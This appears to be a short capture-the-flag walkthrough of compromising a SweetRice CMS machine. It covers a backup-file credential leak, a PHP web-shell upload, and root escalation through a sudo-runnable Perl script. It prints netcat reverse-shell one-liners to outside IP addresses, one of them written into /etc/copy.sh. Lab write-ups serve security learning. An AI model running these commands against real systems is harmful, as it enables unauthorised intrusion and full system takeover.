start with nmap

http and ssh is open.

fuff

/content

in content dircotory sweetrice cms is hosted.

sweetrice is vul for backup disclouse which leak creds.
`/inc/mysql_backup`

got creds

manager:Password123

log in into sweetrice.

another vul present in sweetrice. upload file.

upload file. shell.php5. got rev shell as user.

anyone can run backup.pl as root.

backup.pl:

```pl
#!/usr/bin/perl                                            
                                                                                                                      
system("sh", "/etc/copy.sh"); 
```

lets look at `copy.sh`

copy.sh

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f 
```

add rev shell bash script into copy.sh

```bash	
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.133.3 1337 > /tmp/f" >
 /etc/copy.sh
```

run backup.pl

`sudo /usr/bin/perl /home/itguy/backup.pl`

got root shell.